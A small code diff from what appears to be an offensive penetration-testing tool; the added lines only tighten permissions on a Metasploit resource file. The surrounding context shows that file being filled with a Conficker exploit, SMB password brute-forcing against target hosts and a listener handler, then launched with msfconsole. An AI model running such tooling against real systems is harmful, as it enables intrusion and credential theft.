@@ -624,6 +624,10 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                     config_file.write("exploit -j -z\n")
 
         with open(file, "w") as metarc_file:
+            try:
+                os.chmod(file, 0o600)
+            except OSError:
+                pass
             tgt_list = find_tgts(self.params["rhost"])
             setup_handler(metarc_file, self.params["lhost"], lport)
 
@@ -631,6 +635,10 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                 conficker_exploit(metarc_file, tgt_host, self.params["lhost"], lport)
                 if passwd_file:
                     smb_brute(metarc_file, tgt_host, passwd_file, self.params["lhost"], lport)
+        try:
+            os.chmod(file, 0o600)
+        except OSError:
+            pass
         command = f"msfconsole -r {file}"
         copy2clip(command)
         self.cmd(command)
